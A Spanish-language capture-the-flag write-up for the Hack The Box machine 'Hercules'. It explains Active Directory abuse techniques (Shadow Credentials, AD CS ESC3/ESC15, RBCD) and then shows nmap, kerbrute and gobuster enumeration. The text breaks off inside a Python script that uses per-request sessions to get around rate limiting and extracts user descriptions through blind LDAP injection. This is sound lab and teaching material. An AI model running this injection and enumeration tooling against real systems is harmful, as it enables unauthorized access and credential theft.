---
layout: post
title: HackTheBox-Hercules
description: Resolucion de la maquina Hercules de HackTheBox
date: 2026-07-16 05:22:59 -500
categories: [HTB, Insane]
tags: [AD, RBCD, OU, LPAD]
home_image: logo
logo:
  path: /assets/writeups/hercules.png
  alt: "Hercules"
---
Hercules es una maquina de Windows Active Directory de nivel Insane :v, que se centra en el abuso avanzado de AD, la explotación de servicios de certificado y los ataques de delegación de Kerberos. Antes de empezar con la maquina quisiera que profundicemos en los previos conceptos que debemos de sabe. Cabe resaltar que estoy usando Claude para poder explicar de mejor todos los puntos clave de la maquina. Espero les sirva de algo antes de comenzar. 

## Permisos delegados en Unidades Organizativas (OU) — Ownership y GenericAll

### ¿Que es una OU?

Una Unidad Organizativa (OU) es un contenedor dentro de Active Directory que se usa para organizar objetos (usuarios, equipos, grupos) de forma jerárquica, normalmente reflejando la estructura de la empresa (por departamentos, ubicaciones, etc.). Sobre estas OUs se pueden delegar permisos administrativos sin dar derechos de Domain Admin. 

Ownership (Propietario del objeto): En AD, cada objeto tiene un atributo `nTSecurityDescriptor` que define quién es el **owner** (propietario). El propietario de un objeto **siempre puede modificar su DACL** (la lista de control de acceso), sin importar qué permisos tenga explícitamente asignados. Esto es clave porque: 

Si controlas el owner de una OU (o puedes convertirte en owner mediante `WriteOwner`), puedes otorgarte a ti mismo cualquier permiso sobre ese objeto.

GenericAll: `GenericAll` es uno de los derechos ACE (Access Control Entry) más potentes en AD. Otorga **control total** sobre el objeto, lo que incluye:

- Cambiar la contraseña de un usuario sin conocer la actual
- Añadir miembros a un grupo
- Modificar atributos del objeto (incluyendo `msDS-AllowedToActOnBehalfOfOtherIdentity`, clave para RBCD)
- Si se aplica sobre una OU, **GenericAll se hereda a todos los objetos hijos** dentro de esa OU (dependiendo de la herencia configurada)

## Shadow Credentials 

Es una técnica de abuso que aprovecha el atributo `msDS-KeyCredentialLink` de un objeto de AD (usuario o equipo) introducido para soportar **Windows Hello for Business** y la autenticación por clave pública (PKINIT). 

### ¿Cómo funciona el ataque?

Si tienes permisos de escritura sobre este atributo (`GenericWrite`, `GenericAll`, o el derecho específico `WriteProperty` sobre `msDS-KeyCredentialLink`) en la cuenta objetivo, puedes **añadir tu propio par de claves pública/privada** como "credencial" válida de esa cuenta. 

Con la clave privada que generaste, puedes autenticarte como esa cuenta usando **PKINIT (Kerberos con certificados)**, sin necesidad de conocer ni cambiar la contraseña. 

Esto te permite obtener un **TGT (Ticket Granting Ticket)** válido para esa cuenta, y de ahí extraer el hash NTLM mediante la técnica **"UnPAC the hash"**.

## AD CS y las plantillas de certificados vulnerables (ESC3 / ESC15)

-------------------------------------------------------------------------------------------------------------------------------------------------------------
**EKU** significa **Extended Key Usage** (Uso Extendido de Clave). Es un campo/extensión dentro de un certificado X.509 que define **para qué propósitos específicos se puede usar ese certificado**. Un certificado digital no es "todo vale para todo". El EKU es como una etiqueta que dice: _"este certificado sirve para esto, y solo para esto"_. Windows y otros sistemas revisan este campo antes de aceptar el certificado para una operación concreta.

![alt text](/assets/img/image-6.png)


#### ¿Por qué importa tanto en el contexto de AD CS?

Cuando hablamos de escalada de privilegios en Active Directory Certificate Services, el EKU que más nos interesa como atacantes es **Client Authentication** (o **Smart Card Logon**), porque:

- Un certificado con ese EKU se puede usar para **autenticarse en el dominio vía Kerberos (PKINIT)**, literalmente como si fuera la contraseña de esa cuenta.
- Si logras que se te emita un certificado con este EKU a nombre de **otro usuario** (ej. un Domain Admin), puedes autenticarte como esa persona sin conocer su contraseña.

#### Conectándolo con lo que vimos antes

- **ESC3** abusa del EKU **"Certificate Request Agent"**: te da el "poder" de pedir certificados con Client Auth en nombre de cualquier otro usuario.
- **ESC15** abusa de plantillas mal configuradas donde **tú mismo puedes elegir/inyectar** el EKU (por ejemplo, forzar Client Authentication) aunque la plantilla no estuviera pensada para eso.

### ¿Qué es AD CS?
**Active Directory Certificate Services** es el rol de Windows Server que permite a una organización operar su propia PKI (infraestructura de clave pública) interna, emitiendo certificados para usuarios, equipos y servicios. Los certificados se emiten a partir de **plantillas (templates)** que definen qué propósito tienen, quién puede solicitarlos y con qué configuración. Cuando estas plantillas están mal configuradas, se convierten en una de las rutas de escalada más potentes en AD moderno — catalogadas como **ESC1 a ESC16** (Escalation paths descubiertos principalmente por SpecterOps). 

#### ESC3 — Enrollment Agent abuse

**El problema:** Una plantilla está configurada con el EKU (Extended Key Usage) **"Certificate Request Agent"**, que permite a quien tenga ese certificado **solicitar certificados en nombre de otro usuario** (como un "agente de inscripción").
### Cómo se abusa:
- Solicitas un certificado con el EKU de "Enrollment Agent".
- Usas ese certificado para pedir, en nombre de **cualquier otro usuario** (incluso un Domain Admin), un certificado de autenticación válido para esa plantilla.
- Te autenticas como esa víctima usando el certificado emitido a su nombre — sin conocer su contraseña.

Es básicamente un "certificado que firma certificados de otros" — si lo controlas, controlas la identidad de a quien apunte.

#### ESC15 (antes conocido como "EKU wildcard" / relacionado con Schema v1)

**El problema:** Es una de las adiciones más recientes al catálogo ESC (publicada por Certipy). Ocurre en plantillas de certificado **versión 1** (schema version 1) que tienen el flag `CT_FLAG_NO_SECURITY_EXTENSION` activo o que no restringen bien los EKUs, permitiendo que el **solicitante especifique EKUs arbitrarios** en el momento de la solicitud (mediante "Application Policies" en lugar de las EKUs fijas de la plantilla).

**Cómo se abusa:**

- Solicitas un certificado usando una plantilla vulnerable pero especificas manualmente en la solicitud un EKU de **Client Authentication**.
- Como la plantilla no valida estrictamente qué EKU se pide, el CA (Certificate Authority) emite el certificado con el EKU que TÚ elegiste.
- Resultado: obtienes un certificado de autenticación válido para suplantar a otro usuario, similar en efecto a ESC1, pero explotando una plantilla que en teoría no debería permitir autenticación.

## Cuentas deshabilitadas, control de contraseñas delegado y privilegios de tarjetas inteligentes

#### A) Cuentas deshabilitadas (Disabled Accounts)

**El problema de seguridad:** Que una cuenta esté deshabilitada (`ACCOUNTDISABLE` flag en `userAccountControl`) **no significa que sea irrelevante** para el ataque. Muchos administradores asumen que "deshabilitada = segura" y bajan la guardia sobre sus permisos. 

**Por qué le importa a un atacante:**

- Una cuenta deshabilitada **puede seguir teniendo membresías de grupo peligrosas** o ACEs delegados sobre otros objetos.
- Puedes usarla como "pivote": aunque no puedas iniciar sesión con ella directamente, **si tienes permisos sobre ella (GenericAll, WriteOwner, etc.), puedes reactivarla** (quitando el flag `ACCOUNTDISABLE`) y luego resetear su contraseña.
- A veces las cuentas se deshabilitan pero conservan configuraciones sensibles (como RBCD o vínculos de delegación) que siguen siendo explotables sin siquiera reactivarlas.

#### B) Control de contraseñas delegado (Delegated Password Reset)

**Qué es:** En AD se puede delegar el derecho `User-Force-Change-Password` (o el ACE `Reset Password`) a un usuario u OU específica, sin darle control total sobre la cuenta. Es común en helpdesks/soporte técnico.

**Por qué es explotable:**

- Si tienes este derecho sobre un usuario, puedes **cambiarle la contraseña sin conocer la actual**.
- Combinado con el punto anterior: si una cuenta deshabilitada tiene este derecho delegado a un objeto que tú controlas, puedes reactivarla, resetear su password, y usarla.
- Es más "ruidoso" que Shadow Credentials (genera evento de cambio de contraseña), pero sigue siendo una vía de escalada válida cuando no tienes otras opciones más sigilosas.

#### C) Privilegios relacionados con tarjetas inteligentes (Smart Card) <- Investigar mas sobre esto

**Contexto:** Cuando una cuenta tiene el flag `SMARTCARD_REQUIRED` activado en `userAccountControl`, Windows **fuerza un reset de contraseña automático** cada vez que ese flag se activa/desactiva — Windows genera una contraseña aleatoria nueva internamente.

**Por qué es relevante para el atacante:**

- Esto es clave para el flujo de **Shadow Credentials** que vimos: si una cuenta requiere smart card, normalmente no podrías loguearte con password tradicional. Pero con PKINIT (usando la clave que inyectaste vía msDS-KeyCredentialLink), **sí puedes autenticarte igual**, saltándote esa restricción.
- También existe un truco conocido: si tienes permisos para **activar y luego desactivar** el flag `SMARTCARD_REQUIRED` de una cuenta, Windows regenera la contraseña de la cuenta automáticamente — y si tienes acceso para leerla o interceptarla (o control sobre el objeto), puede ser una vía de escalada adicional.}

## Delegación Restringida Basada en Recursos (RBCD) y S4U2Self / S4U2Proxy

Este es el concepto más denso, así que vamos a construirlo por capas: primero el problema que Kerberos intenta resolver, luego S4U2Self, luego S4U2Proxy, y al final cómo se abusa (RBCD).

#### El problema original: delegación en Kerberos

Imagina un escenario normal: un usuario se autentica contra un **servidor web (Servicio A)**, y ese servidor necesita acceder a un **servidor de base de datos (Servicio B)** _actuando en nombre del usuario_ (no con su propia identidad de servicio). Kerberos necesita un mecanismo para que el Servicio A pueda "hacerse pasar" por el usuario frente al Servicio B. A esto se le llama **delegación**.

Existen varias formas de delegación en Kerberos (no restringida, restringida clásica, y la que nos interesa: **basada en recursos**).

#### A) S4U2Self ("Service for User to Self") -> Servicio para que el usuario se autogestione

**Qué hace:** Permite que un servicio obtenga un **ticket de servicio (TGS) válido para sí mismo, en nombre de cualquier usuario**, sin necesitar la contraseña de ese usuario ni un ticket previo del usuario.

En otras palabras: _"Dame un ticket que diga que el Usuario X se autenticó contra mí"_ — y el KDC (Domain Controller) lo genera, siempre y cuando la cuenta de servicio que lo pide tenga configurado esto (normalmente cualquier cuenta con SPN puede hacerlo, es parte estándar de Kerberos).

**Detalle importante:** Este ticket generado por S4U2Self **no es válido para acceder a otros servicios** — solo sirve para el propio servicio que lo pidió. Ahí es donde entra S4U2Proxy.

#### B) S4U2Proxy ("Service for User to Proxy") -> Servicio para que el usuario actúe como proxy.

**Qué hace:** Toma el ticket obtenido por S4U2Self y lo usa para pedir, ahora sí, **un ticket de servicio válido para un TERCER servicio**, en nombre del usuario original.

Aquí es donde el KDC verifica: _"¿Esta cuenta de servicio tiene permiso para delegar hacia el servicio destino?"_ Esa verificación se hace mirando el atributo:

```
msDS-AllowedToActOnBehalfOfOtherIdentity
```

Este atributo está en el objeto del **servicio destino** (no en el origen), y contiene una lista de qué cuentas tienen permitido delegar hacia él. Esto es literalmente lo que define **RBCD**.

#### C) RBCD — Resource-Based Constrained Delegation

**La clave del abuso:** A diferencia de la delegación restringida "clásica" (que se configura en el objeto origen, y requiere privilegios de Domain Admin para tocar), **RBCD se configura en el objeto DESTINO**, mediante el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity`.

Y aquí está el punto crítico: **cualquier usuario con permisos de escritura (`GenericWrite`, `GenericAll`, `WriteProperty`) sobre ese objeto destino puede modificar ese atributo por sí mismo** — sin ser administrador de dominio.

#### El ataque completo, paso a paso:

1. **Encuentras que tienes permisos de escritura** sobre un objeto de tipo "computadora" o servicio (llamémoslo `TARGET$`) — esto suele venir de la cadena de abusos anteriores (GenericAll heredado de OU, por ejemplo).
2. **Necesitas controlar una cuenta con SPN** (Service Principal Name) — puede ser una máquina que ya controlas, o si tienes privilegios, puedes **crear una cuenta de equipo nueva** (por defecto, cualquier usuario del dominio puede crear hasta 10 cuentas de equipo — `ms-DS-MachineAccountQuota`).
3. **Modificas `msDS-AllowedToActOnBehalfOfOtherIdentity` en `TARGET$`**, añadiendo el SID de tu cuenta controlada (la del paso 2) como "permitida para actuar en su nombre".
4. Ahora, usando tu cuenta controlada, ejecutas:
    - **S4U2Self**: pides un ticket como si fueras "Administrador del Dominio" autenticándose contra tu propia cuenta.
    - **S4U2Proxy**: usas ese ticket para pedir acceso a `TARGET$` en nombre del Administrador de Dominio.
5. El KDC verifica el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` en `TARGET$`, ve que tu cuenta está autorizada, y **emite un TGS válido para que accedas a TARGET$ como si fueras el Administrador de Dominio** — sin conocer jamás su contraseña.
6. Con ese ticket, puedes hacer **DCSync**, montar el C$, o cualquier otra acción administrativa sobre esa máquina.

## Enumeracion con Nmap

Ahora si empezamos con la maquina :). Comenzamos la fase de enumeración ejecutando un escaneo Nmap exhaustivo en la máquina objetivo para identificar puertos abiertos, servicios en ejecución y posibles superficies de ataque: 

```ruby
nmap -sCV -A 10.129.242.196
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-16 06:03 -0500
Nmap scan report for 10.129.242.196
Host is up (0.11s latency).
Not shown: 986 filtered tcp ports (no-response)

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://10.129.242.196/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-16 11:03:26Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
443/tcp  open  ssl/https?
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=hercules.htb
| Subject Alternative Name: DNS:hercules.htb
| Not valid before: 2024-12-04T01:34:56
|_Not valid after:  2034-12-04T01:44:56
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: hercules.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52
|_ssl-date: TLS randomness does not represent time
5986/tcp open  ssl/wsmans?
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=dc.hercules.htb
| Subject Alternative Name: DNS:dc.hercules.htb, DNS:hercules.htb, DNS:HERCULES
| Not valid before: 2024-12-04T01:34:52
|_Not valid after:  2034-12-02T01:34:52

Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|10|11|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_11 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows 10 1703 or Windows 11 21H2 - 23H2 (85%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-16T11:04:15
|_  start_date: N/A
|_clock-skew: -19s

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   107.46 ms 10.10.14.1
2   107.57 ms 10.129.242.196

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.55 seconds
```

Los resultados del análisis revelaron que el objetivo es un servidor Windows, probablemente parte de un entorno de dominio, a juzgar por la cantidad de servicios relacionados con Active Directory en ejecución. El nombre del dominio hercules.htb también se indicaba claramente en varios banners de servicio y certificados SSL y el host llamado dc.hercules.htb. Para que interactuar con el sitio HTTPS sea sencillo, agregué ambos nombres a mi /etc/hosts:

```sh
echo "10.129.242.196 hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts
```

## Lectura de krb5.conf: la configuración de Kerberos confirma el controlador de dominio

Abrimos la configuración de Kerberos en nuestra máquina para ver cómo se resolvía localmente el dominio de destino:

```
nano /etc/krb5.conf
```
Agregamos lo siguiente en el archivo krb5.conf para confirmar el realm Kerberos exacto (HERCULES.HTB) y lo apuntamos directamente a 
dc.hercules.htb como servidor KDC/admin, mientras deshabilitamos el descubrimiento de DNS.

```ini
[libdefaults]
    dns_lookup_kdc = false
    dns_lookup_realm = false
    default_realm = HERCULES.HTB

[realms]
    HERCULES.HTB = {
        kdc = dc.hercules.htb
        admin_server = dc.hercules.htb
        default_domain = hercules.htb
    }

[domain_realm]
    .hercules.htb = HERCULES.HTB
    hercules.htb = HERCULES.HTB
```

Eso hace que nuestra enumeración de Kerberos sea determinista: podemos apuntar directamente al controlador de dominio (o usar su IP) con las herramientas de Impacket para comprobar cuentas vulnerables a AS-REP Roasting y Kerberoasting.

## Enumeración de usuarios de Kerberos con kerbrute

Para enumerar las cuentas de dominio válidas mediante Kerberos, ejecutamos kerbrute contra el controlador de dominio. Esta herramienta intenta realizar solicitudes Kerberos AS-REQ para cada nombre de usuario en la lista de palabras proporcionada y detecta qué cuentas existen en función de las respuestas (sin necesidad de contraseñas): 

```sh
kerbrute userenum --dc 10.129.242.196 -d hercules.htb '/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt' -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/16/26 - Ronnie Flathers @ropnop

2026/07/16 06:26:12 >  Using KDC(s):
2026/07/16 06:26:12 >   10.129.242.196:88

2026/07/16 06:26:12 >  [+] VALID USERNAME:       admin@hercules.htb
2026/07/16 06:26:14 >  [+] VALID USERNAME:       administrator@hercules.htb
2026/07/16 06:26:14 >  [+] VALID USERNAME:       Admin@hercules.htb
2026/07/16 06:26:27 >  [+] VALID USERNAME:       Administrator@hercules.htb
2026/07/16 06:26:46 >  [+] VALID USERNAME:       auditor@hercules.htb
2026/07/16 06:27:40 >  [+] VALID USERNAME:       ADMIN@hercules.htb
2026/07/16 06:58:08 >  [+] VALID USERNAME:       will.s@hercules.htb
```

El KDC reveló múltiples cuentas válidas, destacando varias variantes de admin/administrator, una cuenta auditor, y un usuario will.s. Estos nombres de usuario confirmados nos dan objetivos para AS-REP Roasting, Kerberoasting, y password-spraying controlado. 

Me parecio muy raro encontrar pocos usuarios validos pero al fijarme mas en will.s parece haber un patron (nombre + inicial del apellido). Asi que necesitaremos una lista de nombres de usuario más extensa derivada de los nombres cortos que ya tenía. Ejecuté una línea de código que expande cada nombre base en 26 variantes (name.a→ name.z) y escribe el resultado en el disco:

```bash
awk '{print tolower($0)}' /usr/share/seclists/Usernames/Names/names.txt | \
awk '{for(i=97;i<=122;i++) printf "%s.%c\n", $0, i}' > known_users.txt
```
Y volvemos a ejecutar kerbrute con el nuevo diccionario y el resultado cambia: 
```
kerbrute userenum --dc 10.129.242.196 -d hercules.htb known_users.txt -t 100

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/16/26 - Ronnie Flathers @ropnop

2026/07/16 12:20:12 >  Using KDC(s):
2026/07/16 12:20:12 >   10.129.242.196:88

2026/07/16 12:20:20 >  [+] VALID USERNAME:       adriana.i@hercules.htb
2026/07/16 12:20:36 >  [+] VALID USERNAME:       angelo.o@hercules.htb
2026/07/16 12:20:44 >  [+] VALID USERNAME:       ashley.b@hercules.htb
2026/07/16 12:21:04 >  [+] VALID USERNAME:       bob.w@hercules.htb
2026/07/16 12:21:12 >  [+] VALID USERNAME:       camilla.b@hercules.htb
2026/07/16 12:21:27 >  [+] VALID USERNAME:       clarissa.c@hercules.htb
2026/07/16 12:22:03 >  [+] VALID USERNAME:       elijah.m@hercules.htb
2026/07/16 12:22:21 >  [+] VALID USERNAME:       fiona.c@hercules.htb
2026/07/16 12:22:53 >  [+] VALID USERNAME:       harris.d@hercules.htb
2026/07/16 12:22:53 >  [+] VALID USERNAME:       heather.s@hercules.htb
2026/07/16 12:23:06 >  [+] VALID USERNAME:       jacob.b@hercules.htb
2026/07/16 12:23:16 >  [+] VALID USERNAME:       jennifer.a@hercules.htb
2026/07/16 12:23:17 >  [+] VALID USERNAME:       jessica.e@hercules.htb
2026/07/16 12:23:20 >  [+] VALID USERNAME:       joel.c@hercules.htb
2026/07/16 12:23:20 >  [+] VALID USERNAME:       johanna.f@hercules.htb
2026/07/16 12:23:20 >  [+] VALID USERNAME:       johnathan.j@hercules.htb
2026/07/16 12:23:36 >  [+] VALID USERNAME:       ken.w@hercules.htb
2026/07/16 12:24:15 >  [+] VALID USERNAME:       mark.s@hercules.htb
2026/07/16 12:24:27 >  [+] VALID USERNAME:       mikayla.a@hercules.htb
2026/07/16 12:24:36 >  [+] VALID USERNAME:       natalie.a@hercules.htb
2026/07/16 12:24:36 >  [+] VALID USERNAME:       nate.h@hercules.htb
2026/07/16 12:24:56 >  [+] VALID USERNAME:       patrick.s@hercules.htb
2026/07/16 12:25:06 >  [+] VALID USERNAME:       ramona.l@hercules.htb
2026/07/16 12:25:07 >  [+] VALID USERNAME:       ray.n@hercules.htb
2026/07/16 12:25:10 >  [+] VALID USERNAME:       rene.s@hercules.htb
2026/07/16 12:25:10 >  [+] VALID USERNAME:       rené.s@hercules.htb
2026/07/16 12:25:35 >  [+] VALID USERNAME:       shae.j@hercules.htb
2026/07/16 12:25:53 >  [+] VALID USERNAME:       stephanie.w@hercules.htb
2026/07/16 12:25:54 >  [+] VALID USERNAME:       stephen.m@hercules.htb
2026/07/16 12:25:59 >  [+] VALID USERNAME:       tanya.r@hercules.htb
2026/07/16 12:26:06 >  [+] VALID USERNAME:       tish.c@hercules.htb
2026/07/16 12:26:21 >  [+] VALID USERNAME:       vincent.g@hercules.htb
2026/07/16 12:26:28 >  [+] VALID USERNAME:       will.s@hercules.htb
2026/07/16 12:26:40 >  [+] VALID USERNAME:       zeke.s@hercules.htb
```

## Enumeración Web

Después de configurar la resolución de nombres correctamente, navegamos a https://hercules.htb para inspeccionar manualmente la aplicación web. El sitio parecía estático y minimalista, y una revisión completa del contenido visible, el código fuente y los recursos del lado del cliente no reveló nada explotable de inmediato.

![alt text](/assets/img/h2.png)

![alt text](/assets/img/h3.png)

Dado que no apareció nada obvio mediante la inspección manual, pasamos a la fuerza bruta en los directorios para descubrir endpoints ocultos.

```sh
gobuster dir -u https://hercules.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://hercules.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 27342]
/home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fhome]
/default              (Status: 200) [Size: 27342]
/login                (Status: 200) [Size: 3213]
/content              (Status: 301) [Size: 152] [--> https://hercules.htb/content/]
/Default              (Status: 200) [Size: 27342]
/Home                 (Status: 302) [Size: 141] [--> /Login?ReturnUrl=%2fHome]
/Index                (Status: 200) [Size: 27342]
/Login                (Status: 200) [Size: 3213]
/Content              (Status: 301) [Size: 152] [--> https://hercules.htb/Content/]
```

Gobuster reveló rápidamente varios hallazgos interesantes:

- Endpoints típicos de estilo IIS, como: /index, /default
- Duplicados sin distinción de mayúsculas/minúsculas (/Index, /Default), consistente con un backend de Windows IIS
- Una página de inicio con redirección: /home → HTTP 302
- Lo más destacable es una página de inicio de sesión: /login y /Login (HTTP 200)

La presencia de variantes en minúsculas y mayúsculas confirma aún más que la aplicación está alojada en IIS, donde el uso de mayúsculas/minúsculas en las URLs no se aplica estrictamente.

## Análisis de la funcionalidad de inicio de sesión

Mediante el análisis de directorios, se identificó un endpoint de inicio de sesión en:

![alt text](/assets/img/h8.png)

Las pruebas manuales iniciales confirmaron que la página está protegida mediante un rate limiting. Tras aproximadamente 10 intentos de autenticación fallidos, la aplicación respondió con un error HTTP 429 (Demasiadas solicitudes), bloqueando temporalmente los intentos posteriores durante unos 30 segundos. Esto previene eficazmente los ataques tradicionales de fuerza bruta y de password spraying contra el inicio de sesión web. Debido a esta restricción, para lograr una explotación mayor fue necesario aprovechar un fallo lógico en lugar de adivinar las credenciales.

## Comportamiento del backend de autenticación

Al interceptar la solicitud de inicio de sesión con Burp Suite, se reveló que la aplicación envía las credenciales mediante una solicitud POST a `/Login`, incluyendo un token anti-CSRF estándar de ASP.NET (`__RequestVerificationToken`).

Más importante aún, la aplicación devolvió mensajes de error distintos según la evaluación del backend:

1. "Invalid username."
2. "Login attempt failed."

Esta discrepancia sugiere fuertemente que el proceso de login valida el nombre de usuario por separado de la contraseña, y que las consultas al directorio en el backend están filtrando información a través del comportamiento de las respuestas.

Dado el entorno (IIS + Active Directory), esto indica que el formulario de login está autenticando contra un backend LDAP/Active Directory.

![alt text](/assets/img/h7.png)

## Hipótesis de inyección de LDAP

Ahora viene lo interesante. Sabemos que el formulario de inicio de sesión único (SSO) consulta LDAP. Si la aplicación concatena la entrada del usuario directamente en un filtro LDAP sin la debida sanitización, podemos inyectar nuestra propia lógica de filtrado, al igual que en la inyección SQL, pero para consultas de directorio.

La autenticación LDAP suele basarse en un filtro de búsqueda similar a:

```
(username=<input>)
```

Si la entrada del usuario se inserta directamente en el filtro LDAP sin el escape adecuado, es posible manipular la lógica del filtro. Los filtros LDAP admiten wildcards, operadores lógicos y agrupamiento, lo que los convierte en un objetivo frecuente para ataques de inyección.

El objetivo aquí no era eludir la autenticación directamente, sino extraer atributos confidenciales del directorio, específicamente el campo description de un objeto de usuario.

## Bypass del rate limiting mediante sesiones nuevas

Aunque el mecanismo de rate limiting bloqueaba los intentos de autenticación tras 10 solicitudes fallidas (HTTP 429), notamos que esta protección parecía estar atada a la sesión del usuario en vez de a la dirección IP de origen. Para confirmarlo, en cada solicitud de prueba generamos una sesión HTTP nueva (con sus propias cookies) y solicitamos un token anti-CSRF nuevo antes de enviar el intento de login.


```py
import requests
import string
import urllib3
import re
import time
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# Configuration
BASE = "https://hercules.htb"
LOGIN_PATH = "/Login"
LOGIN_PAGE = "/login"
TARGET_URL = BASE + LOGIN_PATH
VERIFY_TLS = False
# Success indicator (valid user, wrong password)
SUCCESS_INDICATOR = "Login attempt failed"
# Token regex
TOKEN_RE = re.compile(r'name="__RequestVerificationToken"\s+type="hidden"\s+value="([^"]+)"', re.IGNORECASE)
# All enumerated users (replaced as requested)
KNOWN_USERS = [
   "adriana.i",
   "angelo.o",
   "ashley.b",
   "bob.w",
   "camilla.b",
   "clarissa.c",
   "elijah.m",
   "fiona.c",
   "harris.d",
   "heather.s",
   "jacob.b",
   "jennifer.a",
   "jessica.e",
   "joel.c",
   "johanna.f",
   "johnathan.j",
   "ken.w",
   "mark.s",
   "mikayla.a",
   "natalie.a",
   "nate.h",
   "patrick.s",
   "ramona.l",
   "ray.n",
   "rene.s",
   "shae.j",
   "stephanie.w",
   "stephen.m",
   "tanya.r",
   "tish.c",
   "vincent.g",
   "will.s",
   "zeke.s",
   "auditor"
]
def get_token_and_cookie(session):
   """Get fresh CSRF token and cookies"""
   response = session.get(BASE + LOGIN_PAGE, verify=VERIFY_TLS)
   
   token = None
   match = TOKEN_RE.search(response.text)
   if match:
       token = match.group(1)
   
   return token
def test_ldap_injection(username, description_prefix=""):
   """Test if description starts with given prefix using LDAP injection"""
   session = requests.Session()
   
   # Get fresh token
   token = get_token_and_cookie(session)
   if not token:
       return False
   
   # Build LDAP injection payload
   if description_prefix:
       # Escape special characters
       escaped_desc = description_prefix
       if '*' in escaped_desc:
           escaped_desc = escaped_desc.replace('*', '\\2a')
       if '(' in escaped_desc:
           escaped_desc = escaped_desc.replace('(', '\\28')
       if ')' in escaped_desc:
           escaped_desc = escaped_desc.replace(')', '\\29')
       
       payload = f"{username}*)(description={escaped_desc}*"
   else:
       # Check if user has description field
       payload = f"{username}*)(description=*"
   
   # Double URL encode
   encoded_payload = ''.join(f'%{byte:02X}' for byte in payload.encode('utf-8'))
   
   data = {
       "Username": encoded_payload,
       "Password": "test",
       "RememberMe": "false",
       "__RequestVerificationToken": token
   }
   
   try:
       response = session.post(TARGET_URL, data=data, verify=VERIFY_TLS, timeout=5)
       return SUCCESS_INDICATOR in response.text
   except Exception as e:
       return False
def enumerate_description(username):
   """Enumerate description/password field character by character"""
   # Character set - most common password chars first for optimization
   charset = (
       string.ascii_lowercase +
       string.digits +
       string.ascii_uppercase +
       "!@#$_*-." +  # Common special chars
